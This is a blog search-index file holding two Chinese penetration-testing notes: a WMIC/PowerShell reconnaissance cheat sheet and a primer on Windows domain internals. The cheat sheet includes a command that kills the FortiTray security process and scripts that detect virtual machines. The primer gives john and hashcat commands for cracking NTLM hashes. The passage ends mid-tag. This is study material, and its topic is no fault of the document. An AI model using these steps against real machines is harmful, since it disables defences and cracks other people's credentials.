<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>通过Powershell调取wmic</title>
      <link href="2021/06/23/tong-guo-powershell-diao-qu-wmi/"/>
      <url>2021/06/23/tong-guo-powershell-diao-qu-wmi/</url>
      
        <content type="html"><![CDATA[<h4 id="通过Powershell调取wmic"><a href="#通过Powershell调取wmic" class="headerlink" title="通过Powershell调取wmic"></a>通过Powershell调取wmic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">使用wmic识别安装到系统中的补丁情况</span><br><span class="line">C:\&gt; wmic qfe get description,installedOn</span><br><span class="line">识别开机启动的程序,包括路径</span><br><span class="line">C:\&gt;wmic startup list full</span><br><span class="line">查看系统中网卡的IP地址和MAC地址</span><br><span class="line">D:\&gt;wmic nicconfig get ipaddress,macaddress</span><br><span class="line">用户列表</span><br><span class="line">D:\&gt;wmic useraccount list brief</span><br><span class="line">查看当前系统是否有屏保保护,延迟是多少</span><br><span class="line">D:\&gt;wmic desktop get screensaversecure,screensavertimeout</span><br><span class="line">域控机器</span><br><span class="line">D:\&gt;wmic ntdomain list brief</span><br><span class="line">登录用户</span><br><span class="line">D:\&gt;wmic logon list brief</span><br><span class="line">查看系统中开放的共享</span><br><span class="line">D:\&gt;wmic share get name,path</span><br><span class="line">D:\&gt;net share</span><br><span class="line">卸载和重新安装程序</span><br><span class="line">wmic product where &quot;name like &#39;%Office%&#39;&quot; get name</span><br><span class="line">wmic product where name&#x3D;&quot;Office&quot; call uninstall</span><br><span class="line">查看系统中开启的日志</span><br><span class="line">C:\&gt;wmic nteventlog get path,filename,writeable查看系统中安装的软件以及版本</span><br><span class="line">C:\&gt;wmic product get name,version</span><br><span class="line">服务列表</span><br><span class="line">wmic service list brief |more</span><br><span class="line">查看某个进程的详细信息 (路径,命令行参数等)</span><br><span class="line">C:\&gt;wmic process where name&#x3D;&quot;chrome.exe&quot; list full</span><br><span class="line">终止一个进程</span><br><span class="line">D:\&gt;wmic process where name&#x3D;&quot;xshell.exe&quot; call terminate</span><br><span class="line">D:\&gt;ntsd -c q -p 进程的PID</span><br><span class="line">D:\&gt;taskkill -im pid</span><br><span class="line">查看当前系统是否是VMWARE</span><br><span class="line">C:\&gt;wmic bios list full | find &#x2F;i &quot;vmware&quot;</span><br><span class="line">杀毒软件</span><br><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br><span class="line">wmic process where &quot;name like &#39;%forti%&#39;&quot; get name</span><br><span class="line">wmic process where name&#x3D;&quot;FortiTray.exe&quot; call terminate</span><br><span class="line">虚拟机检测</span><br><span class="line">1. 判断TotalPhysicalMemory和NumberOfLogicalProcessors</span><br><span class="line">$VMDetected &#x3D; $False</span><br><span class="line">$Arguments &#x3D; @&#123;</span><br><span class="line">Class &#x3D; &#39;Win32_ComputerSystem&#39;</span><br><span class="line">Filter &#x3D; &#39;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt;</span><br><span class="line">2147483648&#39;</span><br><span class="line">&#125;</span><br><span class="line">if (Get-WmiObject @Arguments) &#123;</span><br><span class="line">$VMDetected &#x3D; $True</span><br><span class="line">&quot;In vm&quot;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">&quot;Not in vm&quot;</span><br><span class="line">&#125;2. 判断虚拟机进程</span><br><span class="line">$VMwareDetected &#x3D; $False</span><br><span class="line">$VMAdapter &#x3D; Get-WmiObject Win32_NetworkAdapter -Filter &#39;Manufacturer LIKE</span><br><span class="line">&quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#39;</span><br><span class="line">$VMBios &#x3D; Get-WmiObject Win32_BIOS -Filter &#39;SerialNumber LIKE &quot;%VMware%&quot;&#39;</span><br><span class="line">$VMToolsRunning &#x3D; Get-WmiObject Win32_Process -Filter</span><br><span class="line">&#39;Name&#x3D;&quot;vmtoolsd.exe&quot;&#39;</span><br><span class="line">if ($VMAdapter -or $VMBios -or $VMToolsRunning)</span><br><span class="line">&#123; $VMwareDetected &#x3D; $True</span><br><span class="line">&quot;in vm&quot;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">&quot;not in vm&quot;</span><br><span class="line">&#125;</span><br><span class="line">获取电脑产品编号和型号信息</span><br><span class="line">wmic baseboard get Product,SerialNumber</span><br><span class="line">wmic bios get serialnumber</span><br><span class="line">安装软件</span><br><span class="line">wmic product get name,version</span><br><span class="line">wmic product list brief</span><br><span class="line">通过Powershell调取wmi</span><br><span class="line">操作系统相关信息</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS</span><br><span class="line">文件&#x2F;目录列表</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile</span><br><span class="line">磁盘卷列表</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume</span><br><span class="line">注册表操作Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv</span><br><span class="line">Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">Get-ItemProperty OptionalComponents</span><br><span class="line">当前进程</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process</span><br><span class="line">列举服务</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service</span><br><span class="line">日志</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent</span><br><span class="line">登陆账户</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser</span><br><span class="line">共享</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share</span><br><span class="line">补丁</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering</span><br><span class="line">杀毒软件</span><br><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-windows基础知识</title>
      <link href="2021/06/23/nei-wang-shen-tou-windows-ji-chu-zhi-shi/"/>
      <url>2021/06/23/nei-wang-shen-tou-windows-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h4 id="Windows-特性"><a href="#Windows-特性" class="headerlink" title="Windows 特性"></a>Windows 特性</h4><h5 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h5><p>工作组是指数台计算机在一个内网中,在逻辑上都属于工作组,但是在工作组中的机器之间相互没有信任<br>关系,每台机器的账号密码只是保存在自己的SAM文件中,那就意味 着如果需要共享资源只能新建一个账<br>号并指定相关资源授予该账号权限才可以完成共享,使得访问资源更有层次化,缺乏管理域控制机制。</p><h5 id="windows用户、组"><a href="#windows用户、组" class="headerlink" title="windows用户、组"></a>windows用户、组</h5><p>不同的用户身份拥有不同的权限</p><p>每个用户包含一个名称和一个密码</p><p>用户账户拥有唯一的安全标识符(security ldentifier,SID)</p><h5 id="Windows-默认账户"><a href="#Windows-默认账户" class="headerlink" title="Windows 默认账户"></a>Windows 默认账户</h5><p>用于特殊用途,一般不需更修改其权限</p><p>与使用者关联的用户账户 Administrator(管理员用户)</p><p>默认的管理员用户 Guest(来宾用户)默认是禁用的</p><h5 id="Windows-内置用户账户"><a href="#Windows-内置用户账户" class="headerlink" title="Windows 内置用户账户"></a>Windows 内置用户账户</h5><p>权限: Guest &gt; User &gt; Administrator &gt; SYSTEM &gt; TrustInstall<br>与windows组件关联的用户账户</p><p>System(本地系统):为windows的核心组件访问文件等资源提供权限</p><p>Local Service(本地服务):预设的拥有最小权限的本地账户</p><p>Network Service(网络服务):具有运行网络服务权限的计算机账户</p><h5 id="Windows-用户属性"><a href="#Windows-用户属性" class="headerlink" title="Windows 用户属性"></a>Windows 用户属性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">displayname</span><br><span class="line">objectsid</span><br><span class="line">userprincipalname</span><br><span class="line">samaccountname</span><br><span class="line">whencreateds</span><br><span class="line">owdlastset</span><br><span class="line">lastlogon</span><br></pre></td></tr></table></figure><h5 id="Windows-内置组"><a href="#Windows-内置组" class="headerlink" title="Windows 内置组"></a>Windows 内置组</h5><p>Administrators</p><p>Guests</p><p>Power Users</p><p>Users(标准用户)</p><p>Remote Desktop Users</p><h5 id="Windows组"><a href="#Windows组" class="headerlink" title="Windows组"></a>Windows组</h5><p>通用组:不能控制对资源对访问,逻辑上将用户归纳,方便发件等</p><p>安全组:权限的集合,对组配置权限便于管理</p><p>全局组</p><p>通用组</p><p>域本地组</p><h5 id="Windows-内置用户账户-1"><a href="#Windows-内置用户账户-1" class="headerlink" title="Windows 内置用户账户"></a>Windows 内置用户账户</h5><p>adminisators组内的用户,都具备系统管理员的权限,它们拥有这台计算机最大的控制权限,可以执行<br>整台计算机的管理任务。内置的系统管理员账号 Adminstrator 就是本地组的成员,而且无法你将它从<br>组删除。如果这台计算机已加入域,则域的Domain Admins 会自动地加入到该计算机的<br>Adminstrators组内。也就是说,域上的系统管理员在这台计算机上也具备着系统管理员的权限。</p><p>Geusts 组是提供给没有用户账户但是需要访问本地计算机资源的用户使用,该组的成员无法永久地改<br>变其桌面的工作环境。该组最常见的默认成员为用户账号Guest。</p><p>Power Users 组内的用户具备比Users组更多的权利,但是比Administrators组拥有的权利更少一些,<br>例如,可以:创建、删除、更改本地用户账户;创建、删除、管理本地计算机内的共享文件与共享打印<br>机;自定义系统设置,例如更改计算机时间、关闭计算机等。但是不可以更改Administrators,无法夺<br>取文件的所有权、无法备份与还原文件、无法安装删除与删除设备驱动程序、无法管理安全与审核日<br>志。</p><p>Users 组内的成员只拥有一些基本的权利,例如运行应用程序,但是他们不能修改操作系统的设置、不<br>能更改其他用户的数据、不能关闭服务器级的计算机。所有添加的本地用户账户者自动属于Users组。<br>如果这台计算机已经加入域,则域的Domain Users会自动地被加入到该计算机的Users组中。</p><p>Remote Desktop Users 组内的成员拥有远程桌面登录的权限。默认Administrators组内的成员都拥有远程桌面的权限。</p><h5 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h5><p>用户账号控制 (User Account Control)</p><p>用户账号控制(user Account Control,简写作UAC)是微软公司在其Windows Vista及更高版本操作<br>系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权,以达<br>到帮助阻止恶意程序(有时也称为“恶意软件”)损坏系统的效果。</p><h5 id="已过滤的管理员令牌"><a href="#已过滤的管理员令牌" class="headerlink" title="已过滤的管理员令牌"></a>已过滤的管理员令牌</h5><ul><li>UAC也使用受限制的令牌来创建已过滤的管理员令牌</li><li>特征:</li></ul><p>完整性级别被设置为中</p><p>参考:深入解析Windows操作系统第六版</p><h5 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ACL(访问控制列表):是否可以访问?</span><br><span class="line">DACL:允许&#x2F;拒绝某用户&#x2F;组的存取控制列表</span><br><span class="line">1.无DACL授予该对象的所有访问权限给任何用户</span><br><span class="line">2.有DACL无ACE拒绝对该对象任意访问</span><br><span class="line">SACL:该对象上的存取方式(读、写、执行)列表</span><br><span class="line">ACE:ACL的每一项</span><br><span class="line">1.谁对你有权限</span><br><span class="line">2.允许&#x2F;拒绝</span><br><span class="line">3.有什么权限:读写执行、对属性读写执行、对特殊属性读写执行</span><br><span class="line">4.是否可以被集成:下属组是否应用</span><br></pre></td></tr></table></figure><h5 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h5><p>SAM(安全账户管理器),SAM是用来存储Windows操作系统密码的数据库文件,为了避免明文密码<br>泄露,SAM文件中保存的是明文密码经过一系列算法处理的Hash值,被保存的Hash分为LM hash、<br>NTLMHash。在用户在本地或远程登录系统时,会将Hash值与SAM文件中保存的Hash值进行对比。在<br>后期的Windows系统中,SAM文件中被保存的密码Hash都被密钥SYSKEY加密。</p><p>SAM文件在磁盘中的位置在C:\windows\system2\config\sam</p><p>SAM文件在WIndows系统启动后被系统锁定,无法进行移动和复制</p><h4 id="hash-详解"><a href="#hash-详解" class="headerlink" title="hash 详解"></a>hash 详解</h4><h5 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h5><p>Windows系统为了保证用户明文密码不会被泄露,将明文密码转换为Hash值进行身份验证,被保存在<br>SAM或者ntds.dit中。</p><h5 id="Hash-背景"><a href="#Hash-背景" class="headerlink" title="Hash 背景"></a>Hash 背景</h5><p>1.LM Hash,在早期的Windows操作系统中将明文密码转换为LM Hash保存在SAM文件中,因为LM<br>Hash使用DES加密,密钥为硬编码,算法又存在缺陷,所以被废弃,为了保证系统兼容性可以自行开<br>启。</p><p>2.NTLM Hash,在LM Hash算法被弃用时,NTLM Hash被用来进行Windows本地及远程身份验证的凭<br>证长度为32bit,由数字和字母组成。<br>Hash示例<br>NTLM Hash</p><p><img src="/images/pasted-114.png" alt="upload successful"></p><p>Net-NTLM v1 hash</p><p><img src="/images/pasted-115.png" alt="upload successful"></p><p>Net-NTLM v2 hash</p><p><img src="/images/pasted-116.png" alt="upload successful"></p><h5 id="LM-Hash漏洞"><a href="#LM-Hash漏洞" class="headerlink" title="LM Hash漏洞"></a>LM Hash漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.不区分大小写,原因见LM Hash生成方法</span><br><span class="line">2.密码最长为14位</span><br><span class="line">3.判断位数</span><br><span class="line">4.DES加密强度较弱</span><br></pre></td></tr></table></figure><h5 id="破解Hash"><a href="#破解Hash" class="headerlink" title="破解Hash"></a>破解Hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LM Hash</span><br><span class="line">1.john --format&#x3D;lm hash.txt</span><br><span class="line">2.hashcat -m 3000 -a 3 hash.txt</span><br><span class="line">NTLM Hash</span><br><span class="line">1.john --format&#x3D;nt hash.txt</span><br><span class="line">2.hashcat -m 1000 -a 3 hash.txt</span><br><span class="line">Net-NTLMv1</span><br><span class="line">1.john --format&#x3D;netntlm hash.txt</span><br><span class="line">2.hashcat -m 5500 -a 3 hash.txt</span><br><span class="line">Net-NTLMv2</span><br><span class="line">1.john --format&#x3D;netntlmv2 hash.txt</span><br><span class="line">2.hashcat -m 5600 -a 3 hash.txt</span><br></pre></td></tr></table></figure><h4 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h4><h5 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h5><p>独立服务器</p><p>成员服务器</p><p>域控制器</p><p>1)域控制器</p><p>2)额外域控制器</p><p>3)只读域控制器</p><h5 id="域"><a href="#域" class="headerlink" title="域"></a>域</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">域:有安全边界的集合,同一域中计算机相互信任,计算机之间允许相互访问</span><br><span class="line">根域:网络中第一个域,一个域林只有一个根域</span><br><span class="line">域树:由多个域组合,形成连续的名字空间。一个.代表一个层次,层次越深级别越低如:dm.org、</span><br><span class="line">mail.dm.org、test.mai.dm.org</span><br><span class="line">域林:一个域林可以有多个域树</span><br><span class="line">如:</span><br><span class="line">dm.org 根域</span><br><span class="line">zhuren.org 域树</span><br></pre></td></tr></table></figure><h5 id="工作组、域"><a href="#工作组、域" class="headerlink" title="工作组、域"></a>工作组、域</h5><p>如何判断是否是域?</p><p>net users /domain</p><p>net time /domain</p><p>systeminfo</p><p><img src="/images/pasted-117.png" alt="upload successful"></p><h5 id="Active-Directory-活动目录-1"><a href="#Active-Directory-活动目录-1" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h5><p>Active Directory,活动目录简称AD,是一个基于DNS并以树状的数据结构来组成网络服务存储了有关<br>网络对象的信息,并以此作为基础对目录信息进行合乎逻辑的分层组织,让管理员和用户能够轻松地查<br>找和使用这些信息。常网域都只有一个,在中型或大型的网络中,网域可能会有很多个,或是和其他公<br>司或组织的AD的相互链接。</p><ul><li><p>在AD里面,一切皆对象,比如:计算机,用户,用户组,相关策略等</p></li><li><p>有AD域Service,即Active Directory Domain Services</p></li><li><p>依赖不同的协议进行用户认证,资源查找,管理,访问控制等等</p></li><li><p>提供各种Service</p><h5 id="活动目录功能"><a href="#活动目录功能" class="headerlink" title="活动目录功能"></a>活动目录功能</h5><p>服务器及客户端计算机管理</p></li></ul><p>用户服务</p><p>资源管理</p><p>桌面配置</p><p>应用系统支撑</p><h4 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">委派:委派是AD的一个功能,允许用户或计算机模拟其他账户。</span><br><span class="line">可以通过用户或计算机账户上的“委派”选项卡配置此功能。通过选择“信任此计算机以委派任何服</span><br><span class="line">务,您将启用”无约束委派“。</span><br><span class="line">您可以指定一组服务主体名称(SPN),以准确限制用户或计算机可以模拟的服务,这将被视为</span><br><span class="line">“约束委派”。</span><br><span class="line">如果使用无约束委派,我们在某个委派服务中心,可以从内存中导出Ticket,进而获得TGT,提升</span><br><span class="line">权限。</span><br><span class="line">如果使用约束委派,我们只可以导出某个服务的ticket,从内存中导出后,获得TGS,只能用来提</span><br><span class="line">升某个服务的权限。</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-118.png" alt="upload successful"></p><h5 id="Kerberos无约束委派"><a href="#Kerberos无约束委派" class="headerlink" title="Kerberos无约束委派"></a>Kerberos无约束委派</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trusteForDelegation</span><br><span class="line">授权的用户账户或计算机账户在Active Directory环境中,允许使用Client资源验证到其他资源上代</span><br><span class="line">其行事</span><br><span class="line">Dm用户-身份验证-Mail Server - 替Dm用户进行验证 - 访问OA</span><br></pre></td></tr></table></figure><h5 id="Kerberos约束委派"><a href="#Kerberos约束委派" class="headerlink" title="Kerberos约束委派"></a>Kerberos约束委派</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">微软为了增强安全性,防止不安全的委派发生,并且加入了S4U2Self和S4U2Proxy协议扩展。</span><br><span class="line">S4U2Self:Service for User to Self</span><br><span class="line">检查用户的合法性</span><br><span class="line">S4U2Proxy:Service for User to Proxy</span><br><span class="line">不允许Service1 代表用户请求其他Service</span><br></pre></td></tr></table></figure><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>RAM</p><p>Hosts</p><p>DNS cache/DNS Server</p><p><img src="/images/pasted-119.png" alt="upload successful"></p><h5 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h5><p>目录数据库时由目录服务数据库和一套访问协议组成<br>特点:<br>1.树状结构,类似文件目录<br>2.它是为查询、浏览和搜素而优化的数据库,读性能强,写性能差,不支持事务处理、回滚等复杂功能<br>目录树<br>条目:树中每一个节点<br>DN(唯一可区别的名称),RDN(相对标示名)<br>属性:描述条目具体信息</p><p><img src="/images/pasted-120.png" alt="upload successful"></p><h4 id="Windows-常见协议"><a href="#Windows-常见协议" class="headerlink" title="Windows 常见协议"></a>Windows 常见协议</h4><p>LDAP<br>轻型目录访问协议(Lightweight Directory Access Protocol)<br>用途:<br>SSO</p><p><img src="/images/pasted-121.png" alt="upload successful"></p><p>389-LDAP<br>636-LDAPS<br>LDAP全局目录</p><p><img src="/images/pasted-122.png" alt="upload successful"></p><p>DC: DNS域名,如DC=dm,DC=org</p><p>OU:组织单元,OU为管理员手动创建,非默认容器,需使用OU,如OU=MAIL,OU=CRMCN:通用名称除了DC、OU外都使用CN</p><p>DN:cn=test,ou=Ops,dc=dm,dc=com 绝对全路径</p><p>RDN:dc=dm、dc=com 每一段路径</p><h5 id="AD域、目录服务、LDAP"><a href="#AD域、目录服务、LDAP" class="headerlink" title="AD域、目录服务、LDAP"></a>AD域、目录服务、LDAP</h5><p>AD域需要用到目录服务,域内信息都存在目录服务中</p><p>LDAP支持用户访问目录服务数据库</p><h5 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h5><p>包含:<br>用户、计算机、工作组、打印机、安全策略、其他组织单元<br>将组策略域OU连接部署</p><h5 id="NTDS-DIT"><a href="#NTDS-DIT" class="headerlink" title="NTDS.DIT"></a>NTDS.DIT</h5><p>ntds.dit是AD中的数据库文件,它被保存在域控制器c:\windows\system32\ntds\NTDS.DIT位置。活动<br>目录的数据库文件(ntds.dit)包含有关活动目录域中所有对象的所有信息,其中包含所有域用户和计<br>算机账户的密码哈希值。该文件在所有域控制器之间自动同步,它只能被域管理员访问和修改。</p><h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><p>kerberos是一种网络认证协议,对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为<br>客户机/服务器应用程序提供强大的认证服务。它允许某实体在非安全网络环境下通信,向另一个实体<br>以一种安全的方式证明自己的身份。该认证过程的实现不依赖于主机操作系统的认证,无需基于主机地<br>址的信任,不要求网络上所有主机的物理安全,并假定网络上传送的数据包可以被任意地读取、修改和<br>插入数据。在以上情况下,Kerberos作为一种可信任的第三方认证服务,是通过传统的密码技术(如:<br>共享密钥)执行认证服务的。</p><h5 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SMB(server Message Block)被称为服务器信息快,又叫网络文件共享系统(CIFS)。在</span><br><span class="line">Windows2000中,SMB除了基于NBT实现,还可以直接通过445端口实现。</span><br><span class="line">SMB 原理</span><br><span class="line">CIFS消息一般使用NetBIOS或TCP协议发送,分别使用不同的端口139或445,当前倾向于使用445端</span><br><span class="line">口。</span><br><span class="line">直接运行在TCP上port 445</span><br><span class="line">通过使用 NetBIOS API</span><br><span class="line">基于UDP ports 137,138&amp;TCP ports 137,139</span><br><span class="line">基于一些传统协议,例如 NBF</span><br></pre></td></tr></table></figure><h5 id="Network-Logon-Type-3"><a href="#Network-Logon-Type-3" class="headerlink" title="Network Logon(Type 3)"></a>Network Logon(Type 3)</h5><p>当账户对远程系统/服务进行身份验证时,将发生网络登录。在网络身份验证期间,可重用凭据不会发<br>送到远程系统。因此,当用户通过网络登录登录到远程系统是,该用户的凭据将不会出现在远程系统上<br>以执行进一步的身份验证。这带来了双跳问题</p><h5 id="IPC-进程间通信"><a href="#IPC-进程间通信" class="headerlink" title="IPC(进程间通信)"></a>IPC(进程间通信)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">简介</span><br><span class="line">指至少两个进程或线程间传送数据或信号的一些技术或方法。</span><br><span class="line">作用</span><br><span class="line">1.信息共享:Web服务器,通过网页浏览器使用进程间通信来共享web文件(网页等)和多媒体</span><br><span class="line">2.加速:维基百科使用通过进程间通信进行交流的多服务器来满足用户的请求</span><br><span class="line">3.模块化</span><br><span class="line">4.私有权分离</span><br></pre></td></tr></table></figure><h5 id="IPC功能"><a href="#IPC功能" class="headerlink" title="IPC功能"></a>IPC功能</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IPC$是共享“命令管道”的资源,为了让进程间通信而开放的命名管道,通过提供可信任的用户名和口</span><br><span class="line">令,连接双发课可以建立安全的通道并以此通道进行加密数据的交换,从而实现对远程计算机的访问,</span><br><span class="line">从NT&#x2F;2000开始使用。</span><br><span class="line">IPC$在同一时间内,两个IP之间只允许建立一个连接。</span><br><span class="line">NT&#x2F;2000操作系统及以上在提供了 ipc$ 功能的同时,在初次安装系统时还打开了默认共享,即所有的</span><br><span class="line">逻辑共享(c、d、e$... ...)和系统目录winnt或管理员目录(admin$)共享。</span><br></pre></td></tr></table></figure><h5 id="IPC-空连接"><a href="#IPC-空连接" class="headerlink" title="IPC 空连接"></a>IPC 空连接</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对于NT,在默认安全设置下,借助空连接可以列举目标主机上的用户和共享,访问everyone权限的共</span><br><span class="line">享,访问小部分注册表等;在Windows Server 2000及以后作用更小,因为在Windows 2000 和以后版</span><br><span class="line">本中默认只有管理员有权从网络访问到注册表。</span><br></pre></td></tr></table></figure><h5 id="Windows名称解析"><a href="#Windows名称解析" class="headerlink" title="Windows名称解析"></a>Windows名称解析</h5><p>FQDN(完全限定域名)</p><p>FQDN由两部分组成:主机名和域名,如: mail.dm.org</p><h5 id="NetBios名称"><a href="#NetBios名称" class="headerlink" title="NetBios名称"></a>NetBios名称</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">默认使用计算机的名字作为当前主机的NetBIOS 名称,长度为16位。前15位为名称,多截少补空,16</span><br><span class="line">位为服务类型,如:</span><br><span class="line">0x20(文件和打印服务)、0x00(工作站服务)、0x03(报信者服务)</span><br><span class="line">NETBIOS 简介</span><br><span 